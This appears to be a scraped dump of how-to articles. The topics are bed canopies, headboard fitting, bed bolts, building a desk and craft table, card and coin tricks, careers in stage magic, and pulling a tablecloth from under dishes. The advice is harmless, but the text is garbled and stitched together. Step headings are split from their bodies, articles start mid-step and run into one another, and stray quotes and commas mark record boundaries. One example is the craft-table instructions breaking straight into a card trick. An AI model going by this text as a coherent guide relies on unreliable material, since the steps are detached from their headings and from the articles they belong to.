With only one drilled hole, use a finishing nail to hold the thread in place. Loop the thread through the button and back through the original hole in the plywood. To keep the thread from simply pulling through the single hole, lay the finishing nail across the back of the hole and loop the thread over the nail and back through the hole. Repeat a few times and then tie off the thread to the finishing nail. Twist the nail to tighten the button down into the fabric to the desired depth. Use a staple gun and staple diagonally across the nail to secure it and keep it from unwinding

,, Use a headboard hanger, which you can get at most home improvement stores. These have two pieces of metal, one that you attach to the headboard and one that you attach to the wall. They slot together, securing the board to the wall.

Gather your materials.,
Cut the rim.,
Attach the curtains.,
Mount the hook.,
Hang the canopy.,
Add finishing touches.",How to Make a Bed Canopy2," You'll need a hanging fruit basket. This should be the type that has only one basket, and four hanging chains that meet up at the center hook. It should also be made of sturdy metal, and not plastic or very thin metal. You'll also need mounting hardware for the basket, wire cutters, and four curtain panels.

, Using metal cutters, cut a 1/4""-1/2"" gap at the center of the rim between each support chain.

, Slide the curtains on, one half of a panel onto one side of the cut gap, the other half on the other side.

, Following the manufacturer's instructions for the mounting hook you got, attach it to the ceiling above the bed. It should be mounted in a ceiling stud, which may require a stud finder to locate.

, Hang the basket to the hook you mounted.

, You can get LED icicle lights (preferably on a battery pack) and put them in the basket to create a chandelier effect. This is not required however. Just enjoy your new bed canopy.

"
"
Gather your materials.,
Mount the flag brackets.,
Insert the dowel rods.,
Hang the fabric.",How to Make a Bed Canopy3," You'll need 1 or 3 adjustable-angle metal flag brackets (the stronger the better), a dowel rod to fit the flag bracket, and long fabric.

, You can have one at the center for a really regal look, or you can use three to get more of an expedition tent look. Mount the first at the center of the bed and the other two (if you want them) directly above the sides of the bed. These must be installed in your wall studs or they will not be strong enough., Put the dowel rods into the pole holder. You should be able to put it all the way in (it should not be too tight). If it is loose, you can make a better fit using wood shims or cardboard pieces.

, Center the fabric on the center pole and drape the ends over the sides of the bed or the hole poles, depending on the style you went with.

Find your divan’s screw holes.,
Screw the struts to the frame.,
Adjust the headboard to your desired height.",How to Fit a Bed Headboard2," Check its back of the divan for two holes, one toward either side. Look where each is most often found, within three to four inches (seven to ten cm) of both the side corner and the top of the frame. With cloth-covered frames, feel with your hand for the holes if the fabric’s pattern makes them difficult to spot.Most but not all frames will already have bolts screwed into place, which makes finding the holes easier.
Larger beds may have more than one screw hole in a vertical line in order to support larger, heavier headboards.

, If your frame already has bolts in place, remove them. Then line up the headboard’s struts with the frame’s screw holes. Insert a bolt through the gap in each strut and screw it into the screw hole. Begin tightening the bolt to the frame, but stop short of tightening it all the way to the point of immobilizing the headboard.Having one or more partners to hold the headboard steady is advisable. Headboards with struts will be especially top-heavy and could fall over while you work.
If your bed frame does not include bolts, contact the manufacturer to ask which size is required so you can purchase them separately.

, Place your mattress on the frame so you can better judge how high you want your headboard to be. Raise or lower the headboard along its struts. If needed, loosen the bolts so you can do so more easily. Once you determine how high or low you wish it to be, use a level to confirm that both sides are raised equally high. Then tighten the bolts all the way to secure the headboard in place.In addition to your mattress, add any other materials that might add height to it, such as foam toppers or electric sheets.
Having partner(s) to raise and lower the headboard will enable you to stand back and judge its height with less fuss.

"
"
Start off as you would with struts.,
Stand the headboard in place.,
Secure the headboard.",How to Fit a Bed Headboard3," Locate the screw holes in the back of the bed’s head. If you find bolts there, remove them. If not, purchase bolts of the appropriate size for the holes you find.Floor-standing headboards and those with struts are installed in nearly identical fashion.

, Note that the struts to a floor-standing headboard are built into the headboard itself. This is the bottom end. Position the headboard upright behind the frame’s head. Line the struts up with the screw holes in the frame. Keep the bottom of the headboard flush on the floor.The chief difference between floor-standing headboards and those with struts is in the name: floor-standing headboards should do just that. Don’t adjust the height as you would with simple struts.

, Fit a bolt through the gap in each strut. Screw it into the corresponding screw hole. Tighten it all the way so the headboard becomes firmly attached to the frame.Have a partner hold the headboard up so it remains flush against the bed frame as you work.

"
"
Measure and mark.,
Find and mark studs.,
Install and measure the cleat.,
Attach the cleat plate to the headboard.,
Hang and secure your headboard.",How to Fit a Bed Headboard4," First, decide exactly how high the headboard should be from the floor. Next, measure the height of the headboard itself to determine where the headboard cleat needs to be installed. Then mark the following measurements in pencil on the wall:The height of the headboard’s bottom from the floor.
The height of its top from the floor.
A fourth of the way down from its top (for the cleat).

, Use a stud-finder to locate studs behind the wall in the area where the headboard will be mounted. For a single cleat, find two consecutive studs that are closest to the center of your bed. Mark each one’s location with pencil on the wall at the height of your third measurement (a fourth of the way down from the top of headboard).Always mount your cleat to studs, even if it isn’t perfectly centered over your bed. A slightly off-center cleat mounted to studs will be stronger than a perfectly centered cleat attached to drywall.
King-size headboards require two cleats. In this case, find four consecutive studs that are closest to your bed’s center.
Standard spacing between studs is 16” (41 cm).

, Screw the cleat into the studs. Test to make sure it is secure and immobile. Then measure from the bottom of the cleat to where the bottom of the headboard will be once mounted.Always test the cleat before hanging your headboard to make sure it is strong enough to support its weight.

, To find out where to attach the cleat plate, refer to your instructions, since the size of the cleat and plate may vary by brand or model. Determine exactly how much height to add to your previous measurement. Then mark the back of your headboard at this new height.Make sure the placement of your marks on the headboard align with the cleat on the wall.
The cleat plate on the back of the headboard should fit directly over the installed cleat.

, First, mount your headboard by lifting its cleat plate up and over the installed cleat so it fits between that and the wall. Next, use your stud-finder to locate two new studs behind the headboard, one on each side, nearest to either end. Support the headboard from the bottom by installing an angle iron in each stud. Refer to your cleat’s instructions for the recommended size iron.Also check for recommendations about attaching spacers toward the bottom of the headboard’s back. The cleat may cause the headboard to project from the wall toward the top. Spacers toward the bottom will keep the headboard straight. The recommended size may vary by brand or model.

Set the bed rail in position against the end piece of your bed frame.,
Slide your bolt through the holes in the rail and end piece.,
Place your washer and nut over the end of the bolt.,
Hold the nut still using your pliers or vice grips.",How to Install Bed Bolts2," Some frames will have a tab you settle a nub from the bed rail into.


This should align the bolt holes in the rail and end piece, making them ready for your bolt.

, Position the bolt so the flat head of the bolt is on the outside of the bed frame. Otherwise, the protruding end of the bolt will snag whoever uses the bed.

, Hand-tighten the nut until you can't tighten it further without tools.

, Simultaneously tighten the nut using the hex wrench. Tighten until the joint no longer wobbles when shaken with one hand.

Get your materials.,
Cut your wood to size using a circular saw.,
Sand your wood.,
Paint the wood.,
Place the pieces.,
Screw the desk top in place.,
Do finishing touches.",How to Build a Desk1," You'll need a 48""x20"" (or similar measurement) piece of MDF or plywood, two adjustable wood trestles (easily found at Ikea or other stores), wood screws, and paint. You will also need a circular saw if your wood is not already cut to your desired measurement.;
, Measure and cut the wood you purchased to the necessary dimensions for the desk top. Remember: measure twice, cut once.


You can also cut a hole in the back of the surface or at the edge, in order to fit cables through.

, Unless you have found pre-finished wood panels, you will want to sand the desk. You can rent a power sander to save time. Wipe off the desk when you are done.


Use 40-grit sandpaper if your wood needs stripping and resurfacing.
Use 80-grit sandpaper to smooth out imperfections.
Use 360-grit sandpaper at the end of sanding, to further smooth the surface before staining. , If you want your desk to be a color, you can paint the trestles and desktop. Spray paint will probably go on the fastest, but you can use regular paint as well. Keep in mind that a wood stain will only work if your wood is unfinished.


You can choose different colors for the cabinets/trestles and desktop, but you should choose colors that will compliment your house.

, Bring the pieces into the room where the desk will be used. This saves you the trouble of carrying the whole desk in later. Set the desktop atop the trestles, so that the bar of the trestle is a few notches up and the two trestles are placed evenly about 3"" from each end of the desk top. You can check to make sure that it's level but for most situations it won't need to be completely perfect.

, Using appropriately long wood screws, screw through the desk top and into the trestles, 3 screws to each side (evenly spaced). You can further secure the desk if you can find 4 corner brackets that are small enough to screw into the desk top and the adjustable trestle surface.

, Use some wood putty to fill the screws and then finish with some paint touch-ups. Add any other finishing touches you want as well. Enjoy your new desk!


Remember that you can use the trestles to adjust the height of the desk.

Purchase at least two modular shelving units, which will be the base of the table.,
Purchase one unfinished 36-inch by 80-inch interior slab door.,
Purchase a box of drywall screws, that are approximately 1-1/4inches long.,
Purchase three cans of spray paint.,
Apply the first coat of paint.,
It is recommended that a nice musical playlist is available to listen to during construction.

,
Do not spray your paint too much in one spot.,
Wash your hands, once the item is assembled, to ensure you won't get any paint on the base.,
Place the storage units so the 36-inch wide dimensions are facing each other.,
Continue to paint the door, if you'd like to.

,
Wash your hands.,
Carry the door(s) inside to where the base is.,
Use the screws and drill to drill the screws up from the bottom of the shelves of the base into the tabletop.

,
Continue to drill the base and top together until they are secure.,
Mount the table to the wall(optional), once the top is secure to your base and the edges of both are flush with each other, the base should have came packaged with brackets that allow the table to mount to the wall.,
Wait at least 24 hours prior to the use of your newly assembled craft table to ensure nothing placed on the top sticks to the paint.,
Use your table after the 24 hour period has expired!

",How to Build a Craft Table," Laura wanted the white-colored ones. For maximum work and storage space a it is recommend to purchase a unit that is 36 inches (91.4 cm) by 36 inches (91.4 cm) Stackable 9-Cube Organizer. There are other great bands of organizers other than the one that is in the link. In order to match the door width, dimensions should be: 36 inches (91.4 cm) high, 36 inches (91.4 cm) wide and 11-1/2 inches deep. Cost is about $45 per unit.;
, Basically, look for a flat door that has no designs or holes in it for where the knobs go. As stated before, ensure the widths of the door and the shelving units match up. Cost is about $27.

, A pound of these will cost about $7.

, Since the top of the table soaks in the paint like a sponge, approximately three cans of paint were used to get to the color white that was desired. One can per coat was used. Since the wood grain still shows through on the second coat, the constructor can also use less spray paint to get that “distressed” look that is so hip in pop culture nowadays. Cost is about $4 per can.


As stated before, these items could fit all in a Volkswagen Jetta. Creative arranging of the seats to fit the items will be required. The driver may get jammed right up against the steering wheel, but keep in mind that this trip is only across town, not across the country.

, After these items have been maneuvered in the car and home, it is suggested that the first coat of paint goes on the door immediately. Lay the door in a well-ventilated area that your neighbors or landlord/landlady won’t mind you using. (A Tip: Put safety glasses on. You are going to be working with spray paint as well as drilling into wood. Your eyes will thank you.

,, Give the door a nice even coat. You can always add more.

, Once the door has its first layer of paint, a hand washing is recommended before assembling the base. Start assembling the storage units for the table bottom. Follow the directions that come with them.

, Place them about 57 inches (144.8 cm) apart so when you measure the entire span of the two units, they cover 80 inches (203.2 cm) of space.(While the picture is of the completed table, it is pictured to give a reference of how the bases should be aligned)

,, Once the door is dry, a hand washing is needed. Filthy hands leave smudges on light-colored objects. If the door is not painted door, disregard this step)

, Gently lay it on top of the two bases. If the dimensions are correct, the tabletop and the bases should be flush.

,, It is important to be patient during this step. Keep the drill bit square to the screw. This is so the drill bit does not “jump” around in the screw’s top and strip the screw.

, Doing so, will add increased stability of the unit.

, Despite the paint being dry to the touch, sometimes newly painted surfaces can still be tacky if continuous pressure is applied. (I put books on my newly painted bookshelf too early so now I have outlines of books on my shelf where the paint was ripped off when I pulled the books off the shelf.)

;
, With the deck back in a stack, pick up the top half of the deck and tilt it down, so you can see the underside. Ask the volunteer to place the card face down onto the bottom half of the deck.









Again, she should make sure you cannot see the chosen card.

, The top half of the deck is pointed toward you. Quickly look at the underside and memorize this card on the bottom of this stack. This will be your ""key card."" Place the two halves of the deck together. You haven't seen the chosen card yet, but you know it is underneath your key card.








, To show that you're not up to any tricks, ask the volunteer to cut the deck. She may cut as many times as she likes.








, Flip cards from the top of the deck onto a face-up stack on the table. When you see your key card, note the card immediately after it — the chosen card. Continue flipping without slowing down for another three or four cards. Place these slightly offset so the chosen card is still visible.









The audience should think you made a mistake. If you slow down the flipping or show a reaction, it won't be fooled.
When you stop flipping, leave the top card of the stack pulled out, as though you were about to flip it.

, Tell the audience ""The next card I flip over will be your card."" Hover your hand over the top card of the stack, pretending you are about to flip it over. Move your hand to the chosen card face up on the table, and slowly flip it face down in front of the audience.








, Before you begin, choose any card from an ordinary deck. Write the name of this card on a piece of paper, and fold it so the name is hidden. Place this card on top of the deck.









This sets up a ""force:"" a trick that appears to give someone a choice, but forces her to make the choice you want. This specific trick is one of the simplest forces to perform, the ""Criss Cross Force.""

, Hold out the deck to the volunteer and ask her to cut it (place half on the table). Keep the bottom half of the deck in your hands.








, Set the half you're holding over the half on the table, so the halves cross at an angle. Say ""we'll just mark the place where you cut for now.""









This is a lie — the card in between the two halves was not the place she cut to. It's actually the top card of the deck, which you have written on your piece of paper.

, Bring the audience's attention away from the cards by lifting your head to make eye contact. Distract them for a few seconds by talking, to take their mind off what just happened.









For example, say ""Now, she could have cut at any position. Ten cards down, twenty cards down, any number. But I can predict exactly the card she cut to.""

, Now return to the deck of cards and say ""Let's see which card you cut to."" Pick up the top half the deck, and ask the spectator to pick up the next card on top.








, As the spectator shows the card to the audience, reveal that you had already predicted which card she would cut to. Unfold the piece of paper to show the name of that card.









Encourage skeptics to look at the deck of cards, proving it's an ordinary deck.

, Coin tricks are common in magic performances. Practicing this trick will teach you a fundamental technique of coin tricks: the ""French drop."" This relies on misdirection and careful maneuvering to make a coin vanish:To get started, pick any large coin. You may want to try a few coins and see which you find easiest to use.








, Form a ""C"" with your hand and grip the edge of the coin between your fingers and thumb. Turn your hand so the coin is facing upward, with your curved fingers underneath it. Make the coin clearly visible to the audience.









The coin edge should run along the length of your finger and thumb.

, Reach over to grab the coin with your other hand, hiding the coin from the audience's view.








, Instead of taking the coin, let it drop back onto the lowest joint of your fingers. Keep them bent slightly so the coin stays in position, gripped between your lowest finger joints and the top of your palm. Meanwhile, withdraw your empty hand, as though it were holding the coin.








, Lift the hand that's supposedly took the coin. Slowly lift your fingers one by one, revealing that your hand is empty.








, Now lift the hand that's really holding the coin and reveal the coin to your audience.









Practice holding the coin between your palm and lowest finger joints. In this position, you can move your hand with open fingers, making it look empty before the coin suddenly appears.

, There are a tricks out there for all levels of magicians. If you're enjoying the simple sleight of hand tricks above, learn more fundamentals like the back palm vanish, card rise, or coin knuckle roll.

While all magicians know sleight of hand, not all of them specialize in these close-up tricks. You can also look into club magic (medium audiences), stage magic (large audiences), escape tricks, and mentalism.

, Masters of the art know what an audience wants to see, so pay attention to what types of tricks and what styles modern magicians use. See which magicians appeal to you the most, and try to think about what about their style and approach to the audience appeals to you. You can watch contemporary magicians or even watch videos of some famous magicians to see how they master their art. Here are some magicians you may want to observe carefully:


David Copperfield
Tommy Wonder
Mark Wilson
Doug Henning

, Read any biography of a magician and you'll see that most of them started off by going to the library and checking out books about magic and reading them from cover to cover. This can help you have an understanding of the discipline that is truly required to be a magician, and the fact that you won't spend most of your time performing in front of captivated audiences: you'll be on your own, learning how to master complicated magic tricks.The Tarbell Course in Magic Volumes 1 - 8

, Though you should still use books to learn about being a magician, DVDs and online videos can also help you hone your craft. There are thousands of them out there and you have to make sure that you're getting a video from a reputable magician and that you're not paying for a cheap video with tricks that are too easy.Online communities of amateur and professional magicians can help guide you to good sources.

, Once you've gained some skills, reach out to a local professional magician and ask if you can be an apprentice and give you some helpful feedback. You'd be surprised by how helpful many professional magicians can be, remembering themselves when they were starting out. You just have to be receptive to feedback and be ready to take some criticism that can improve your craft.


He might not reveal you any tricks, but he could give you tips on how to perform your first tricks like a pro. If you don't have this advantage, try to learn from your mistakes as much as possible. Over time, you will know what your audience wants most.

, Once you've mastered the basic tricks and have gained your footing as a magician, then it's time to be your own kind of magician -- you can't just rely on the tricks of others if you really want to succeed. No one wants to see an unoriginal magic act being performed over and over. Of course, you should have some (or many) old and famous magic tricks in your act (such as the cups and balls). The public may enjoy some old classics (like the Miser's Dream), but you should avoid certain old classics, like pulling a rabbit out of a hat (instead make it appear in a box).


Instead, think of an idea that has never been done before. For example, make strings disappear from a guitar. Then, decide how you will accomplish the effect. Now, think of a way to make the trick convincing. Make some equipment, if necessary.You might even need duplicate object with which you're working on. Once you've got all the parts planned out, start practicing the trick.
Develop a unique style of performing. Don't steal others' styles. You may take an old (dead) magician's style and put a unique twist on it, but never take a modern magician's style. It's better to have unique style and perform previously performed tricks, rather than take someone else's style and perform your own tricks.

, If you want to be a great magician, then you can't just have a great repertoire of tricks if you don't have the personal qualities that make you receptive to the craft. Here are some of the traits that you need to master:Commitment
Self-discipline
Patience
The ability to process info
Good communication
Dressing fashionably

, Magic is theater and a magician is a performer. You don't have to go to acting school, but if you're shy in front of a crowd or just want to feel more comfortable in front of a crowd, then take an acting class or two to step up your game.Private acting lessons are very expensive, but you can learn a lot in a group setting.

, Before performing a show, be sure to rehearse it many times. You also might need to know how the room you perform in is designed. If you're performing at a party at your friend's house, that's not really necessary. Just make sure there's no one behind you. Your equipment should be made properly. Be sure to check, if everything works.


Also, try to merge several tricks together to create a new effect. For example, after you turn a ball into a tissue, make a coin appear out of the tissue; then, make the coin go through your hand.

, If you can't produce your own equipment, ask some of your friends to do it for you, or go to a magic store or website and buy the equipment. Also, you might consider making people to help you as your assistants during your tricks (You already gave away the secret of many tricks to them, so why not make them part of the show?).

, A traditional costume for magician is a black jacket, a red formal vest that goes under it, and a pair of black pants that go with the jacket. The jacket should have many little pockets on its inside for storage of secret coins, cards, balls, etc. The vest should have big pockets on the inside so you can make big objects, such as plates, disappear/appear. And pants should have two pockets, one on each side. The pocket should be long and made under the folded part of the pants.


Also consider using the same basic outline of the costume to create a more modern one. One thing is certain you should dress a little nicer than the people you will be performing for.
Remember that comfort is also important when you make your costume. If you're feeling itchy or stifled in a costume, then it doesn't matter if you look incredible.

, Start with coin manipulation. It's easiest to master, but it is still challenging. You'll find links to helpful websites in external links section of the tutorial. Anyway, back to coin manipulation. Learn how to palm the coin on your hand. Find a spot in your palm where the coin will stick the most even if you open/close your hand, or turn it upside down. Then, learn creating illusions (like pretending to put an object in your other hand when really its still located in the first hand).


After mastering coin manipulation, you can move on to ball manipulation and, finally, card manipulation.


, Try to narrate or tell a story with your tricks. Be very humorous and funny (unless your style is to be mysterious or serious). If your magic act is boring, no one would want to watch it. Remember to tell some jokes every once in a while that relate to the trick. You might also want music playing during your act, just to make it more exciting.


Sound effects can have a great impact too. But do not make an act with only music and no talking because then practically nobody would know what's going on.

, Working the audience is a big part of being a great magician. What kind of audience do you have? Is the crowd overly enthusiastic and up for anything? Too critical or bored? A bit tipsy? You have to know who your crowd is and to tailor your tricks to the mood of the audience accordingly.


This will require some improvisation. You may see that your opening trick is wrong for the audience you have and will have to switch things up at the last minute.
If you're at a corporate event or another event with other acts, watch the other acts to see how the audience reacts, and see if you can recall those acts in your own act for bonus points.

, When you're just starting out, don't expect to work a corporate event with 500 people. You'll have to start with the people you know, which can be your friends, your family, your acquaintances, or your family friends. This is how it works: you perform for your friends or family at a birthday party and someone at the party likes your routine and then says, ""Hey, I have a friend who's having a birthday party..."" and bam! You've got your first real gig.Have patience. It can take time to build up enough skills to get work this way. Make sure that you're really ready when you start performing for an audience and you'll raise your chances of getting noticed.
Performing in front of a smaller, more intimate audience will make you more comfortable when it's time to get in front of crowds of strangers.

, Some magicians like to work as street performers and to try their tricks out in front of random crowds. Your only pay will be whatever people throw into your magician's hat, and you may be faced with some tough audiences. However, this is a great way to build up nerves of steel and to get more comfortable in front of anything an audience throws your way.


If you choose to go this route, then make sure you're not taking over another magician or street performer's location. People are pretty touchy about their territory and you don't want to get into a conflict.

, As you build a following, you can start working at ""real"" gigs -- kids' birthday parties, hospitals, churches, adult birthday parties, or really anything you can get your hands on. This will be a great way of cutting your teeth in the world of magic and getting a sense of what kind of audience you really want to perform for and what audiences you like best. This can help you discover what kind of a magician you want to be -- maybe you'll see that you like exclusively performing for adults or only children.


Be prepared to do this for a while. It can take years to rise above this level.

, If you really want to build up a reputation as a magician, then you have to market yourself. This means make a professional-looking business card, take your career to social media, and make a professional-looking website. This will help people learn more about you when they're looking to hire a magician for an event. Consider making one with the help of a professional if you're committed to marketing yourself.Give out your business card as often as you can.
Stop by local magic shops and ask if they need anyone to perform or if you can leave your business card with them.

, This can help cover any accidents that may occur when you're performing in front of a crowd. Though your acts should be safe and careful, it can help cover anything inadvertent that happens, like having an audience member get injured by a prop.

, Once you've been around a while, you'll start to attend events for magicians and will work bigger gigs. You'll hopefully already have some contacts in the magic world from your previous gigs and from when you asked professionals for help. Continue to attend as many events as you can and promote yourself without being annoying. The more contacts you make, the more likely you'll be to find work.


If you make networking a priority, then you'll be more likely to meet a manager or an agent (see next step.)

, An agent or a manger can be the key to a magician's success. If you want to really make it a magician, then you may need a manager who will help you find more work, promote you, and keep the work coming. An agent can be useful in this regard too, but he or she may get up to 15-20% of the commission for the gigs that he or she can find you. You can continue to work independently, but these people can be valuable for your career., If you've worked for years and years, have marketed yourself, have built a following, and have worked enough gigs, then you may have been lucky enough to have risen to the big leagues and to make magic a full-time job. Don't be disheartened if you haven't -- you can still consider yourself a real magician even if you have to do temp work the other half of the time to make ends meet; it's about following your passion, not making the big bucks. Still, if you have made it to the big leagues, then here are some of the events you may work:Corporate functions
Country clubs
Upscale charity fundraisers
High end private events, such as anniversaries, elegant children's parties, or holiday parties

, A true magician doesn't reveal his secrets -- especially if other magicians are practicing them. If you're talking magic with a friend of yours, then you may trade secrets from time to time. But if you're accosted by the annoying type of person who insists he knows how you've done a trick or begs you to tell him how you've done something, you'll have to learn to tell these people to bug off.


A true magician honors his craft. Revealing your secrets is betraying your commitment to being a magician.

, Being a good magician means more than wowing your audience with one trick after another. It means knowing how to charm the crowd while you're performing the tricks, which can take a while. If you want to mesmerize your audience, then you have to be able to captivate them, keep them interested, and even distract them when you're in the middle of a difficult trick. Essentially, it means making captivating small talk to a room full of strangers -- it's not as hard as it sounds.

, If you want to be a masterful magician and to be in touch with magicians in your area and worldwide, then you should join a magic club so you can see what the latest magicians are working on and continue to hone your craft. Some of the most reputable clubs include The International Brotherhood of Magicians and The Society of American Magicians. You can also join the online club, The Magic Classroom.

, If you want to be the best magician you can be, then you have to keep your tricks current. Check out what other magicians in your field are up to by going to local shows. Talk to your magician friends to see what they've been working on. Don't do the same old thing one year after the next or people will start to think of you as ""old rabbit out of a hat.""

Operating props, wrestling out of chains, or making a quick change behind a satin curtain are all physically strenuous. Your audience seeing you out of breath could leave them thinking you're less than magical.


Renowned magician and illusionist, Harry Houdini, was reportedly in such good shape and of such remarkable toughness that he would claim he could withstand any punch to the stomach.Consider an aerobic exercise, like cycling, jogging, or swimming. The backstage behind a performance can be quite hectic, and some aerobic fortitude will help you pull off your act.
Some strength training, like moderate weight lifting, can be an asset as well. Some of your equipment is bound to be heavy, and if it's an important part of your illusion, you might not want anyone else setting it up. A little muscle would help, in such a case.;
, When you become a famous illusionist, people will constantly try to catch you off guard and reveal you to be an ordinary man. Exceptional reflexes will not only help protect your reputation, but could also save your life. Some magic, especially the more daring escapology tricks, can be very dangerous.Pick up racquetball
Play table tennis
Practice with a reaction ball, A great deal of magic, especially that of close up magic, requires the deft manipulation of items with your hands. Dexterity can also be the difference between your artful execution with a prop and a fumble in front of your audience.


Practice coin tricks.These typically require and train exceptional dexterity in your hands, and often can be translated to other small objects.

, A great illusionist will have to contend with many distractions throughout his performance. You may have cheering fans, lights winking from the flashes of cell phones and cameras, or a ceiling of spikes lowering slowly closer to your head. The ability to focus, maintain presence, and stay calm are the mark of a master.


Build your focus with concentration exercises.Visualize the execution of your illusion. Studies have shown that this improves execution and focus., There are many books that break down simple tricks and explain various techniques for achieving common magic. Even if you cannot perform a certain illusion, knowing the method behind it could be useful to you down the road.

, Some stage persona can be radically different from who you are in your private life. There's no right or wrong when it comes to choosing a stage presence, but you need to be able to sink into this character like a second skin so that your audience believes you when you say, ""I will disappear,"" and so each person leans forward in anticipation when you say, ""And now, for my next illusion..."", Some notable stage illusionists include Siegfried and Roy, David Copperfield, Harry Houdini, and Penn and Teller.Stage illusions often make use of the distance between the seated audience and the illusionist on stage to preserve its appearance of reality.To invent your own stage illusions, you will need an understanding of the psychology of perception, a creative mind, and, potentially, a trustworthy carpenter.Instead of getting bogged down in complex mechanisms and Rube-Goldberg-esque contraptions, begin first with the effect you want to achieve. Do you want your audience to think you have mastery over an orb of fire? Do you want to make it appear as though you can manipulate space and time? Start with the effect, and work backwards.
Stage illusions can take a long time to imagine, a longer time to design, and an even longer time to perfect to performance standards. You will need to be patient if you want to be an accomplished stage illusionist.

, This brand of magic is usually performed at about 10 feet or less from your audience, with the prestidigitator usually seated at a table.These tricks often make use of simple props, like cards, coins, and other baubles, manipulating these with ease and finesse that makes the object seem to appear, disappear, and move through space in strange and surprising ways.


Train yourself by constantly keeping your hands engaged. Carry a deck of cards or a special coin wherever you go, and constantly drill palms, drops, and shuffles until your hands can grasp nearly any object and deftly make it disappear.
Close-up magic, being highly translatable to any small object, should be a strong skill in an illusionists repertoire.

, Even if you don't want to gain a reputation as a psychic or a telepath, the psychology you learn in studying mentalist technique will help you better understand and manipulate the perceptions of your audience. Mentalism is a tradition of magic that makes use of body language, cold reading, and suggestion to give the impression that you have psychic powers like telepathy or precognition.One of the most important weapons in a mentalists arsenal is the ability to sort the truth from lies., Though this aspect of magic can be quite harrowing, playing off time limits and dangerous situations to build tension and impress an audience, a basic understanding of this art can help you cultivate your persona and mystique.Your ability to disable a lock or some other restraint or trap can leave people bewildered as to how you did it and whether you really are magic.

, This doesn't mean you have to challenge other notable magicians, though if you managed to come out on top of that competition, it would surely give you credibility. It's just as good to find your own niche and establish yourself as an expert in that particular category.


Try to improve upon or add a surprising twist to a trick performed by an illusionist who inspired you. The more notable the trick, the more likely other professional illusionists will look at you as a master.

, It's impossible to be a master illusionist if no one sees your illusion, at least not in the world of performance magic! You may need to take one of your innovative stage illusions on tour and put on live shows, or perhaps there is a venue in city close by where you can start building your following.


Some magician's societies work to connect performers with venues.There are many city based, country based, and international societies that might be able to find you a stage.
Some venues utilize live performers than others. Once you have a routine you're sure will amaze, you can inquire and audition with casinos or restaurants that promote live shows.
Don't forget that the Internet is a great place to gain recognition. A website with your contact information and a list of your specialties can put interested parties in contact with you.

, Once you've perfected your basic skills, developed some tricks of your own, and gotten a reputation as an illusionist of repute, now's the time to perform your magnum opus. This will be unique for every master illusionist, but the crowning jewel in your career should leave even the most brilliant minds in the magical community scratching their heads.


David Copperfield wowed the world when he made the Statue of Liberty disappear in one of his most famous illusions., The ability of world-class illusionists to consistently impress and amaze audiences can turn into a lifelong career. Entertainment oriented cities, like Las Vegas, are famous for hiring master performers, including illusionists.

, This is not necessarily required for a master illusionist. Many mainstream performers, like Pen and Teller, have been performing magic for decades.However, at the height of your career, after achieving your magnum opus, your best trick, if you were to disappear from the scene of magic... well, wouldn't that be mysterious?

Decide on the illusion.,
After deciding the type of impromptu trick to perform, consider the source used to obtain information on the illusion.,
Focus on the mechanics and experimentation of the trick.,
Practice and refine.,
Just do it.",How to Be Ready to Perform Impromptu Magic Tricks," Impromptu magic is a very broad field of magic with endless possibilities. The illusion can range anywhere from making something disappear, to changing one item into another completely. Items used can include seemingly anything.


Items such as pens, toothpicks, napkins, paper, dollar bills, and more are typically used in impromptu magic. It is completely up to the magician what type of illusion they wish to perform and what items they wish to use.
Keeping this in mind will always give the magician the upper hand. However, true impromptu magic involves doing magic that is improvised with borrowed items, opposed to your own, and nothing more. This tends to lead to a much stronger effect in the end and will impress the audience that much more.;
,


The internet is a great source to obtain information on impromptu magic however, it is not the only source.
Other sources include magic books, professionals, and sometimes even friends or family. Each of these sources has their own advantages and disadvantages.
Magic books and professionals will tend to be the more credible sources; however sometimes learning from a book can be difficult, opposed to hands on learning or a video tutorial.
The internet, family, and friends are usually the cheapest and most convenient methods of learning impromptu magic.
However, when choosing a source it is important to keep in mind that deceiving a live audience is much different than deceiving a single webcam.
With this now in mind, consider that the money spent on getting the most valuable information from the most trusted sources can possibly be more beneficial. Always consider multiple sources for a broader learning experience.

, Many impromptu magic tricks involve misdirection, or acts of diverting an audience’s attention. Impromptu tricks also involve something called “sleight of hand,” which is simply a cleverly executed hand motion or act of deception in order to produce the proper illusion.


It comes in many forms and combinations and can be used to produce multiple effects. Often when learning a new trick immediate repetition of “sleight of hand” is conducted in hopes of memorizing the steps of the illusion. Repeating an illusion’s actions without any thought only causes other possibilities to vanish.
Keeping an open mind is very important when learning impromptu magic. There are countless ways a trick can be interpreted and applied. Being open to new ways of performing a trick and never blindly repeating is the best mindset to have in regards to the experimentation of the trick.

, Once the mechanics have become second nature and come clearly into focus, the refinement and polishing of the trick can begin. Practice is the most important step to learning impromptu magic.


A good magician will often practice a trick numerous times before performing it in front of an audience. As a close-up impromptu magician knowing how to adapt to different situations is important.
Using a mirror to practice will display how the illusion looks from multiple angles and allow for that much more efficiency when performing.
It is also important when practicing to slowly increase the audience size. Begin with a mirror then move on to a single close friend or family member. If the up-close illusion is successful continue to practice on other individual close friends or family members before moving on to larger audiences. Larger audiences mean more eyes on the magician which will require that much more misdirection and “sleight of hand” to make the illusion a success.

, As simple as it may sound, this is not always the easiest thing to do. When in front of an actual audience nerves can begin to have an effect.


The key is to remain calm and composed and remember any practice methods. Luckily impromptu magic tends to be one-on-one or with small crowds. Impromptu magic often occurs when individually asked to show someone a magic trick.
This will help deal with any nerves of facing large crowds as impromptu is usually a spur of the moment illusion. Again, simply keeping calm, remembering practice methods, and keeping in mind that the audience does not know what is going to happen, can put the magician at ease and allow them to perform comfortably.

",How to Pull a Tablecloth from Under a Place Setting,"


Make sure the tablecloth is flat on the table and free of wrinkles.






The tablecloth should be flush with the end opposite that from which you will be pulling (the cloth should not overhang the table along that edge).






Let the tablecloth hang well over the edge from which you will be pulling.





;
, Begin with just one plate or bowl right in the middle of the table. Once you master this, add more dishes and arrange some of them closer to the table's edges until you are prepared to do the trick with a real table setting.

, If the dishes are too light, the trick will be hard to perform. This is especially a problem with plastic dishes. Usually, however, dishes have something in or on them at the table, so this isn't a problem. If you're practicing, put some fruit in the dishes, as this minimizes any spillage problem.

, Position yourself so that you are at about the midpoint of the edge of the tablecloth you'll be pulling.

, If you've laid the tablecloth correctly, you'll have plenty of cloth draped over the edge of the table from which you'll be pulling. Use your hands to bunch this excess cloth up until you reach the edge of the table.

, Very quickly pull the tablecloth straight toward the floor. As you are doing so, smoothly step back from the table, but do not pull the tablecloth outward.

If you are using a globe-shaped canning jar for your crystal ball, glue the LED tea light to the inside of the lid.

, You will glue this to the outside of the bottom of your clear drinking glass.


